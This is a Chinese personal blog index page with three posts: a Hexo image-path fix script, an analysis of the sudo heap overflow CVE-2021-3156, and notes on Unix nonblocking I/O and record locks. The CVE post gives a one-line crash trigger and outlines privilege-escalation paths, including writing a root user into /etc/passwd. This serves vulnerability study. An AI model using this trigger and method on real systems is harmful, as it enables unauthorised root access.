<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>P1AIN0&#39;S BLOG</title>
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="P1AIN0&#39;S BLOG"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="P1AIN0&#39;S BLOG" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 5.4.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">P1AIN0&#39;S BLOG</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>P1AIN0&#39;S BLOG<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/09/09/遇到hexo莫名其妙的bug/" >遇到hexo莫名其妙的bug</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-09-09  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		
            
            
		
            
            
		

	

	</div>
  <a type="button" href="/2021/09/09/遇到hexo莫名其妙的bug/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>最近blog换了hexo，遇到一些坑，记录下。图片就是不显示，遂看看是哪里出了问题用浏览器的查看元素查看图片的位置，发现图片的引用路径里不知道为啥多了个 <code>/.io//</code>,百度谷歌后无果，提了个issue没人理我。然后想着写个脚本给改过来。就是每次generate后都要执行一遍，有点麻烦。不过图片显示的问题解决了。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span>(<span class="params">fd</span>):</span></span><br><span class="line">    html = fd.read()</span><br><span class="line">    html = html.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    s = html.find(<span class="string">&#x27;&lt;img src=&quot;/.io//&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    html2 = html.replace(<span class="string">&#x27;&lt;img src=&quot;/.io//&#x27;</span>, <span class="string">&#x27;&lt;img src=&quot;&#x27;</span>)</span><br><span class="line">    fd.seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    fd.write(html2.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&quot;./public/&quot;</span>):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            fname = os.path.join(root, file)</span><br><span class="line">            <span class="keyword">if</span> (file == <span class="string">&quot;index.html&quot;</span>):</span><br><span class="line">                <span class="comment">#print(fname)</span></span><br><span class="line">                fd = <span class="built_in">open</span>(fname, <span class="string">&quot;rb+&quot;</span>)</span><br><span class="line">                modify(fd)</span><br><span class="line">                fd.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/2021/09/09/遇到hexo莫名其妙的bug/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/09/07/CVE-2021-3156分析/" >2021-08-04-CVE-2021-3156分析</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-09-07  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		

	

	</div>
  <a type="button" href="/2021/09/07/CVE-2021-3156分析/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s &#x27;\&#x27; `perl -e &#x27;print &quot;A&quot; x 64&#x27;`</span><br></pre></td></tr></table></figure>

<p>崩了</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>如果sudo在一个shell环境中被执行了：</p>
<ul>
<li>使用 -s 参数选项设置sudo的MODE_SHELL标志；</li>
<li>或者通过 -i 参数选项设置sudo的MODE_SHELL和MODE_LOGIN_SHELL标志；然后在sudo的main()的开头调用parse_args()重写argv</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Parse command line arguments. */</span></span><br><span class="line"> sudo_mode = <span class="built_in">parse_args</span>(argc, argv, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);</span><br><span class="line"> <span class="built_in">sudo_debug_printf</span>(SUDO_DEBUG_DEBUG, <span class="string">&quot;sudo_mode %d&quot;</span>, sudo_mode);</span><br></pre></td></tr></table></figure>

<p>直接定位到漏洞函数处：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">set_cmnd</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">/* set user_args */</span></span><br><span class="line">    <span class="keyword">if</span> (NewArgc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> *to, *from, **av;</span><br><span class="line">        <span class="keyword">size_t</span> size, n;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">        <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">        size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">sudo_warnx</span>(<span class="built_in">U_</span>(<span class="string">&quot;%s: %s&quot;</span>), __func__, <span class="built_in">U_</span>(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">        <span class="built_in">debug_return_int</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ISSET</span>(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment">         * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment">         * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (*from) &#123;</span><br><span class="line">            <span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">                from++;</span><br><span class="line">            *to++ = *from++;</span><br><span class="line">            &#125;</span><br><span class="line">            *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; *av; av++) &#123;</span><br><span class="line">            n = <span class="built_in">strlcpy</span>(to, *av, size - (to - user_args));</span><br><span class="line">            <span class="keyword">if</span> (n &gt;= size - (to - user_args)) &#123;</span><br><span class="line">            <span class="built_in">sudo_warnx</span>(<span class="built_in">U_</span>(<span class="string">&quot;internal error, %s overflow&quot;</span>), __func__);</span><br><span class="line">            <span class="built_in">debug_return_int</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            to += n;</span><br><span class="line">            *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((user_base = <span class="built_in">strrchr</span>(user_cmnd, <span class="string">&#x27;/&#x27;</span>)) != <span class="literal">NULL</span>)</span><br><span class="line">    user_base++;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    user_base = user_cmnd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">update_defaults</span>(SETDEF_CMND, <span class="literal">false</span>)) &#123;</span><br><span class="line">    <span class="built_in">log_warningx</span>(SLOG_SEND_MAIL|SLOG_NO_STDERR,</span><br><span class="line">        <span class="built_in">N_</span>(<span class="string">&quot;problem with defaults entries&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">debug_return_int</span>(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若from[0]为\并且from[1]是NULL结束字符（不为空格），因此进入if条件 from++后此时指向NULL结束字符，而下一行from++指向下个字符串开头，若该字符串存在，则继续这个while循环，因此造成了堆溢出。通过动态调试可见，程序越界读取\后的“AAAAA….”字符，进入下一轮while循环：</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Qualys团队提供了三种漏洞利用手段：</p>
<p>1.<code>struct sudo_hook_entry</code>覆盖:</p>
<p>sudo程序在process_hooks_getenv()函数crash了；因为我们直接覆盖了函数getenv_fn()的指针。一个<code>struct sudo_hook_entry</code>的结构体，修改<code>struct sudo_hook_entry</code>实例可以实现任意代码执行的目的。</p>
<p>但是这里会有一个其他的问题，就是ASLR，我们可以通过部分写入的方式绕过ASLR，</p>
<p>2.<code>struct service_user</code>覆盖</p>
<p>Qualys团队分析第二个cash，发现crash在了nss_load_library()的函数上。crash的原因是我们覆盖了library的指针。我们可以通过重写<code>struct service_user</code>结构体，实现任意代码的执行。我们把<code>ni-&gt;library</code>覆盖为NULL,<code>ni-&gt;name</code>(初始化为systemd)覆盖为X/X,</p>
<p>service_user结构体实现如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//nss/nsswitch.h#L61</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Action according to result.  */</span></span><br><span class="line">  lookup_actions actions[<span class="number">5</span>];</span><br><span class="line">  <span class="comment">/* Link to the underlying library object.  */</span></span><br><span class="line">  service_library *library;</span><br><span class="line">  <span class="comment">/* Collection of known functions.  */</span></span><br><span class="line">  <span class="keyword">void</span> *known;</span><br><span class="line">  <span class="comment">/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...).  */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="number">328</span> <span class="built_in">nss_load_library</span> (service_user *ni)</span><br><span class="line"><span class="number">329</span> &#123;</span><br><span class="line"><span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">331</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">338</span>       ni-&gt;library = <span class="built_in">nss_new_service</span> (service_table ?: &amp;default_table,</span><br><span class="line"><span class="number">339</span>                                      ni-&gt;name);</span><br><span class="line">...</span><br><span class="line"><span class="number">342</span>     &#125;</span><br><span class="line"><span class="number">343</span></span><br><span class="line"><span class="number">344</span>   <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">345</span>     &#123;</span><br><span class="line"><span class="number">346</span>       <span class="comment">/* Load the shared library.  */</span></span><br><span class="line"><span class="number">347</span>       <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line"><span class="number">348</span>                       + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line"><span class="number">349</span>       <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line"><span class="number">350</span>       <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"><span class="number">351</span></span><br><span class="line"><span class="number">352</span>       <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line"><span class="number">353</span>       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line"><span class="number">354</span>                                               <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line"><span class="number">355</span>                                     ni-&gt;name),</span><br><span class="line"><span class="number">356</span>                           <span class="string">&quot;.so&quot;</span>),</span><br><span class="line"><span class="number">357</span>                 __nss_shlib_revision);</span><br><span class="line"><span class="number">358</span></span><br><span class="line"><span class="number">359</span>       ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br><span class="line">------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>在353-357行，构造分享库名字为”libnss_X/X.so.2”，在359行从当前目录中加载名字为”libnss_X/X.so.2”的动态链接库。并执行_init构造函数。</p>
<p>3.def_timestampdir覆盖。</p>
<p>第三种利用方式不是直接从sudo的crash中，是通过观察获得的。在Fuzzing的时候sudo创建了数十个新的目录（AAAA AAAAA等），这些目录中的每一个都属于 root 并且只包含一个小的文件，以我自己的用户命名：sudo 的时间戳文件——我们显然覆盖了 def_timestampdir，sudo 的时间戳目录的名称。如果我们通过目录名覆盖def_timestampdir，然后我们可以与 sudo 的 ts_mkdirs() 竞争，创建一个符号链接到任意文件。<br>可以以root的身份打开这个任意文件，写struct timestamp_entry到它的里边。但是现在有两个问题：</p>
<p>(1)如果 Sudo 的 timestamp_open() 指向的文件早于启动时间，则会删除我们的任意符号链接。 我们能够通过创建一个非常旧的时间戳文件（来自 Unix 时代），等待直到 timestamp_open() 删除它，并通过与 timestamp_open() 竞争来创建我们最终的、任意的符号链接来解决第一个问题。</p>
<p>(2)我们不控制写入任意文件的 struct timestamp_entry 的内容。 据我们所知，我们只控制三个字节（进程 ID 或结构时间规范），我们无法将这个三字节写入转换为完全 root 权限。</p>
<p>然而我们可以通过sudo的timestamp_lock()的一个小bug规避掉第二个问题。如果我们在与 ts_mkdirs() 和 timestamp_open() 的两个之间利用，并且我们的任意符号链接指向 /etc/passwd，那么这个文件将以 root 身份打开，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------</span><br><span class="line"> <span class="number">65</span> <span class="class"><span class="keyword">struct</span> <span class="title">timestamp_entry</span> &#123;</span></span><br><span class="line"> <span class="number">66</span>     <span class="keyword">unsigned</span> <span class="keyword">short</span> version;     <span class="comment">/* version number */</span></span><br><span class="line"> <span class="number">67</span>     <span class="keyword">unsigned</span> <span class="keyword">short</span> size;        <span class="comment">/* entry size */</span></span><br><span class="line"> <span class="number">68</span>     <span class="keyword">unsigned</span> <span class="keyword">short</span> type;        <span class="comment">/* TS_GLOBAL, TS_TTY, TS_PPID */</span></span><br><span class="line"> ..</span><br><span class="line"> <span class="number">78</span> &#125;;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"> <span class="number">305</span> <span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line"> <span class="number">306</span> <span class="built_in">ts_write</span>(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> *fname, struct timestamp_entry *entry, <span class="keyword">off_t</span> offset)</span><br><span class="line"> <span class="number">307</span> &#123;</span><br><span class="line"> ...</span><br><span class="line"> <span class="number">318</span>         nwritten = <span class="built_in">pwrite</span>(fd, entry, entry-&gt;size, offset);</span><br><span class="line"> ...</span><br><span class="line"> <span class="number">350</span> &#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"> <span class="number">619</span> <span class="keyword">bool</span></span><br><span class="line"> <span class="number">620</span> <span class="built_in">timestamp_lock</span>(<span class="keyword">void</span> *vcookie, struct passwd *pw)</span><br><span class="line"> <span class="number">621</span> &#123;</span><br><span class="line"> <span class="number">622</span>     <span class="class"><span class="keyword">struct</span> <span class="title">ts_cookie</span> *<span class="title">cookie</span> =</span> vcookie;</span><br><span class="line"> <span class="number">623</span>     <span class="class"><span class="keyword">struct</span> <span class="title">timestamp_entry</span> <span class="title">entry</span>;</span></span><br><span class="line"> ...</span><br><span class="line"> <span class="number">644</span>     nread = <span class="built_in">read</span>(cookie-&gt;fd, &amp;entry, <span class="built_in"><span class="keyword">sizeof</span></span>(entry));</span><br><span class="line"> <span class="number">645</span>     <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line"> ...</span><br><span class="line"> <span class="number">652</span>     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (entry.type != TS_LOCKEXCL) &#123;</span><br><span class="line"> ...</span><br><span class="line"> <span class="number">657</span>         <span class="keyword">if</span> (<span class="built_in">ts_write</span>(cookie-&gt;fd, cookie-&gt;fname, &amp;entry, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>在644行，/etc/passwd文件的头0x38字节被读到栈上的<code>timestamp_entry</code>结构体中,</p>
<p>在652行，<code>entry.type</code> is 0x783a (“:x”), 不是TS_LOCKEXCL;</p>
<p>在657和318行,<code>entry-&gt;size</code>个字节，从栈上的entry被写到/etc/passwd中，但是<code>entry-&gt;size</code> 实际上是0x746f (“ot”), 不是sizeof(struct timestamp_entry)</p>
<p>之后我们向/etc/passwd中注入了一个与root拥有相同权限的新用户，从而完成提权。</p>

	
	</div>
  <a type="button" href="/2021/09/07/CVE-2021-3156分析/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/09/02/高级IO/" >高级I/O</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-09-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		

	

	</div>
  <a type="button" href="/2021/09/02/高级IO/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="非阻塞I-O"><a href="#非阻塞I-O" class="headerlink" title="非阻塞I/O"></a>非阻塞I/O</h2><p>如果某些文件类型(如读管道、终端设备和网络设备)的数据并不存在，读操作可能会使调用者永远阻塞；</p>
<p>如果数据不能被相同的文件类型立即接受(如：管道中无空间、网路流控制)，写操作可能会使调用者永远阻塞；</p>
<p>在某些条件发生之前打开某些文件可能回发生阻塞(如要打开一个终端设备，需要先等待与之连接的调制解调器应答，又如若以只写模式打开FIFO，那么在没有其他进程已用读模式打开该FIFO时也要等待)；</p>
<p>对已经加上强制性记录锁的文件进行读写；</p>
<p>某些ioctl操作；</p>
<p>某些进程间通信函数。</p>
<p>非阻塞I/O使我们可以发出open、read和write这样的I/O操作，并使这些操作不会永远阻塞。如果这种操作不能完成，则调用立即出错返回，表示该操作如继续执行将阻塞。</p>
<p>对于一个给定的描述符，有两种为其指定非阻塞I/O的方法。</p>
<pre><code>1.如果调用open获得的描述符，则可以指定O_NONBLOCK标志。
2.对于已经打开的一个描述符，则可调用fcntl，由该函数打开O_NONBLOCK文件状态标志。
</code></pre>
<h2 id="记录锁"><a href="#记录锁" class="headerlink" title="记录锁"></a>记录锁</h2><p>记录锁（record locking）的功能是：当第一个进程正在读或修改文件的某个部分时，使用记录锁可以阻止其他进程修改同一文件区。</p>
<p>fcntl记录锁：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcnt1.h&gt;</span>int fcnt1(int fd, int cmd, ...<span class="comment">/* struct flock *flockptr */</span>);</span></span><br></pre></td></tr></table></figure>

<p>返回值：若成功，依赖于cmd（见下），否则，返回−1对于记录锁，cmd是F_GETLK、F_SETLK或F_SETLKW。第三个参数（我们将调用flockptr）是一个指向flock结构的指针。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flock</span> &#123;</span></span><br><span class="line">    <span class="keyword">short</span> l_type;<span class="comment">/* F_RDLCK(共享读锁), F_WRLCK（独占性写锁）, or F_UNLCK（解锁一个区域） */</span></span><br><span class="line">    <span class="keyword">short</span> l_whence;<span class="comment">/* SEEK_SET, SEEK_CUR, or SEEK_END */</span></span><br><span class="line">    <span class="keyword">off_t</span> l_start;<span class="comment">/* offset in bytes, relative to l_whence */</span></span><br><span class="line">    <span class="keyword">off_t</span> l_len;<span class="comment">/* length, in bytes; 0 means lock to EOF */</span></span><br><span class="line">    <span class="keyword">pid_t</span> l_pid;<span class="comment">/* returned with F_GETLK */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="I-O多路转接"><a href="#I-O多路转接" class="headerlink" title="I/O多路转接"></a>I/O多路转接</h2><p>果必须从两个描述符读，在这种情况下，我们不能在任一个描述符上进行阻塞读（read），否则可能会因为被阻塞在一个描述符的读操作上而导致另一个描述符即使有数据也无法处理。</p>
<p>为了使用这种技术，先构造一张我们感兴趣的描述符（通常都不止一个）的列表，然后调用一个函数，直到这些描述符中的一个已准备好进行I/O时，该函数才返回。poll、pselect和select这3个函数使我们能够执行I/O多路转接。在从这些函数返回时，进程会被告知哪些描述符已准备好可以进行I/O。</p>
